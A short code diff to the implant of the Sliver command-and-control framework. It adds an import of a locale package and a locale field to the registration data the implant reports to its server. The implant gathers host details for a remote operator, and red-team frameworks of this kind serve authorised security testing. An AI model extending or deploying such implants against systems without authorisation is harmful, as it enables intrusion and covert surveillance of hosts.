@@ -51,6 +51,7 @@ import (
 	consts "github.com/bishopfox/sliver/implant/sliver/constants"
 	"github.com/bishopfox/sliver/implant/sliver/handlers"
 	"github.com/bishopfox/sliver/implant/sliver/hostuuid"
+	"github.com/bishopfox/sliver/implant/sliver/locale"
 	"github.com/bishopfox/sliver/implant/sliver/limits"
 	"github.com/bishopfox/sliver/implant/sliver/pivots"
 	"github.com/bishopfox/sliver/implant/sliver/transports"
@@ -685,5 +686,6 @@ func registerSliver() *sliverpb.Register {
 		ReconnectInterval: int64(transports.GetReconnectInterval()),
 		ConfigID:          "{{ .Config.ID }}",
 		PeerID:            pivots.MyPeerID,
+		Locale:            locale.GetLocale(),
 	}
 }
